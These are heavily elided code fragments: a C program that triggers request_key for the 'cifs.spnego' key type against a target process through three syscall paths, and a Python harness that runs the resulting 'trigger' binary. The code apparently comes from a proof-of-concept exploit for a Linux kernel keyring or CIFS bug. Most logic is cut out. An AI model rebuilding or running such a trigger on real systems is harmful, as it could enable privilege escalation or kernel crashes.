...
int main(int argc, char **argv)
{
        ...
        /* method 1: request_key syscall (249) */
        fprintf(stderr, "[1] request_key(cifs.spnego) target_pid=%d\n", pid);
        ...
        /* method 2: keyctl KEYCTL_REQUEST2 (syscall 250) */
        fprintf(stderr, "[2] keyctl(REQUEST2, cifs.spnego)\n");
        sigprocmask(SIG_SETMASK, &blk, &old);
        errno = 0;
        ...
        /* method 3: int 0x80 (32-bit compat syscall) */
        {
                ...
                if (lo != MAP_FAILED) {
                        ...
                        fprintf(stderr, "[3] int 0x80 compat request_key\n");
                        sigprocmask(SIG_SETMASK, &blk, &old);
                        errno = 0;
                        __asm__ volatile(
                                "int $0x80"
...
def main() -> None:
    ...
    try:
        ...
        trigger_result = run(
            [str(WORKDIR / "trigger"), str(holder_pid)],
            check=False,
        )
